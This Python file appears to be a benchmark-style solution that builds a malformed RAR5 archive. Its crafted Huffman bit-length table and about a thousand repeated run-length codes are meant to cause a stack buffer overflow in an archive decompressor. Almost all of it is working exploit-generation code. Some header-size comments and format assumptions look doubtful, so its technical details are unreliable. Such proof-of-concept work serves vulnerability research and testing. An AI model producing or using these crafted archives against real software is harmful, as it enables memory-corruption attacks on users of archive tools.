import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def to_vint(n):
            out = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                    out.append(byte)
                else:
                    out.append(byte)
                    break
            return bytes(out)

        # 1. Payload Generation
        # Construct a malicious compressed stream that triggers a stack buffer overflow
        # during Huffman table parsing. We exploit the RLE decoding logic.
        
        bits = []
        # "Table Present" flag = 1
        bits.append(1)
        
        # BitLength Table (Table C) - 20 entries of 4 bits each.
        # We define a minimal Huffman tree:
        # Index 0 (Val 0) -> Length 1
        # Index 17 (Val 17, RLE Zero) -> Length 1
        # All others -> Length 0
        
        # Index 0: Length 1 ('0001')
        bits.extend([0, 0, 0, 1])
        # Index 1-16: Length 0 ('0000')
        for _ in range(16):
            bits.extend([0, 0, 0, 0])
        # Index 17: Length 1 ('0001')
        bits.extend([0, 0, 0, 1])
        # Index 18-19: Length 0 ('0000')
        for _ in range(2):
            bits.extend([0, 0, 0, 0])
            
        # Huffman Codes assigned:
        # Val 0: Code 0
        # Val 17: Code 1
        
        # Generate Main Table payload
        # Repeatedly send Code 17 (bit 1) with max repeat count to overflow the table buffer.
        # Code 17 implies "Repeat Zeros". It reads 3 bits for count.
        # We send '1' (Code 17) followed by '111' (Count 7 -> 10 zeros).
        # Repeating this ~1000 times writes ~10,000 entries, overflowing typical stack buffers (e.g., 256-512 bytes).
        for _ in range(1000):
            bits.append(1)
            bits.extend([1, 1, 1])

        # Pack bits into bytes (MSB first)
        payload = bytearray()
        curr_val = 0
        curr_bits = 0
        for b in bits:
            if b:
                curr_val |= (1 << (7 - curr_bits))
            curr_bits += 1
            if curr_bits == 8:
                payload.append(curr_val)
                curr_val = 0
                curr_bits = 0
        if curr_bits > 0:
            payload.append(curr_val)

        # 2. Construct RAR5 Container
        sig = b"\x52\x61\x72\x21\x1a\x07\x01\x00"
        
        # Main Header
        # Format: CRC(4) | Size(V) | Type(V) | Flags(V)
        mh_type = 1
        mh_flags = 0
        mh_content = to_vint(mh_type) + to_vint(mh_flags)
        # Size includes Size field itself + Content + CRC(4)
        # We assume Size fits in 1 byte vint (true for small headers)
        mh_size_val = len(mh_content) + 1 + 4 
        mh_size_bytes = to_vint(mh_size_val)
        mh_data = mh_size_bytes + mh_content
        mh_crc = zlib.crc32(mh_data) & 0xFFFFFFFF
        main_header = struct.pack('<I', mh_crc) + mh_data
        
        # File Header
        # Format: CRC(4) | Size(V) | Type(V) | Flags(V) | [DataSize] | Attr | CompInfo | HostOS | NameLen | Name
        fh_type = 2
        fh_flags = 0x0001 # Has Data
        fh_data_size = len(payload)
        fh_attr = 0
        fh_comp_info = 0x20 # Method 4 (Normal) - Required to trigger Huffman parsing
        fh_host_os = 0
        fh_name = b"poc"
        fh_name_len = len(fh_name)
        
        fh_content = to_vint(fh_flags) + \
                     to_vint(fh_data_size) + \
                     to_vint(fh_attr) + \
                     to_vint(fh_comp_info) + \
                     to_vint(fh_host_os) + \
                     to_vint(fh_name_len) + \
                     fh_name
                     
        fh_content_with_type = to_vint(fh_type) + fh_content
        fh_size_val = len(fh_content_with_type) + 1 + 4
        fh_size_bytes = to_vint(fh_size_val)
        fh_data = fh_size_bytes + fh_content_with_type
        fh_crc = zlib.crc32(fh_data) & 0xFFFFFFFF
        file_header = struct.pack('<I', fh_crc) + fh_data
        
        return sig + main_header + file_header + payload